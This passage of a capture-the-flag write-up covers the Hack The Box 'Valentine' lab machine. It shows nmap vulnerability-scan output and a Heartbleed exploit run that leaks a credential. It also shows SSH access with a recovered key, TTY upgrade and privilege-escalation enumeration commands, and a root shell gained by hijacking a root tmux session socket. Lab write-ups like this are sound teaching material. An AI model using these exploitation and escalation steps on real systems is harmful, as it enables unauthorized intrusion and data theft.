|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.securityfocus.com/bid/70574
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

# Nmap done at Tue Aug 29 08:05:25 2023 -- 1 IP address (1 host up) scanned in 54.84 seconds
```

When I saw this I realized that I wasted a lot of my time because if I had done this at the beginning it would have saved me a lot of work.

## Exploiting

Having said all this, I got to work and exploited the machine thanks to the vulnerability called Heartbleed, in this way:

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ python2 heartbleed.py 10.10.10.79 -p 443     

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==^......V.TC..|.Ks<l

┌──(kali㉿kali)-[~/HTB/valentine]
└─$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d 
heartbleedbelievethehype
```

Seeing what the victim machine returned ($text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=) I immediately knew it was base64 encrypted (ends in ==), so I decoded it and got the following credential → **heartbleedbelievethehype**

After obtaining the above credential I immediately went to test it on the id_rsa and bingoo!

But not everything was going to be so easy, as I got a strange error when trying to connect, but I googled it and followed the steps to fix it:

first of all I leave the url here → https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported

![Untitled](/HTB/stack-valentine.png)

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ ssh -i id_rsa hype@10.10.10.79 
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported // THE ERROR
hype@10.10.10.79's password: 

to solve it I put this into ~/.ssh/config:

	┌──(kali㉿kali)-[~/HTB/valentine]
	└─$ cat ~/.ssh/config
	Host 10.10.10.79
    	PubkeyAcceptedKeyTypes=+ssh-rsa
	    HostKeyAlgorithms=+ssh-rsa

//SO WE ARE IN//
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ ssh -i id_rsa hype@10.10.10.79
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$
```

## Treatment of tty

```bash
 script /dev/null -c bash
 ctrl + z
 stty raw -echo; fg
 restet xterm
 export TERM=xterm
```

## Escalating Privileges

Next I run the usual things that I always do:

```bash
 sudo -l
 cat /etc/crontab
 find / -perm -4000 2>/dev/null
 find / -type f -writable 2>/dev/null
 bash procmon.sh
 lsb_release -a
 uname -a
 id
 getcap -r / 2>/dev/null
```

After checking all the basics I ran the `procmon.sh` program and found the following:

```ruby
> hype     [bash]
> hype     [bash]
> root     CRON
> root     /bin/sh -c   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
> root     /bin/sh -e /usr/lib/php5/maxlifetime
> root     php5 -c /etc/php5/apache2/php.ini -d error_reporting='~E_ALL' -r print ini_get("session.gc_maxlifetime");
< root     /bin/sh -c   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
> hype     [bash] <defunct>
> hype     [bash] <defunct>
> hype     [bash] <defunct>
> hype     [bash] <defunct>
> hype     [bash] <defunct>
```

Which had me analyzing for a while until I saw that it wasn't that way apparently.

So I decided to look at other things, until at one point I happened to look at the commands I had saved in the history and saw something from `tmux` 😇

```ruby
hype@Valentine:~$ ls -la
total 152
drwxr-xr-x 21 hype hype  4096 Aug 29 12:07 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype  1658 Aug 29 14:49 **.bash_history -> this**
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
drwxr-xr-x  2 hype hype  4096 Aug 25  2022 Desktop
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
-rw-rw-r--  1 hype hype   326 Aug 29 12:07 procmon.sh
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
-rw-rw-r--  1 hype hype    33 Aug 29 11:30 user.txt
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old

hype@Valentine:~$ cat .bash_history
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
**tmux -S /.devs/dev_sess -> this**

hype@Valentine:~$ tmux -S /.devs/dev_sess

root@Valentine:/home/hype# whoami
root
```

Now only rests to saw the flag 😎

pd: privileges could also have been escalated due to the outdated version of the kernel that could be seen with the `uname -a` command.

## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about Heartbleed
    
- Were there any novel tools or techniques employed?
    
    Exploting Heartbleed and configure the ssh connection to work properly.
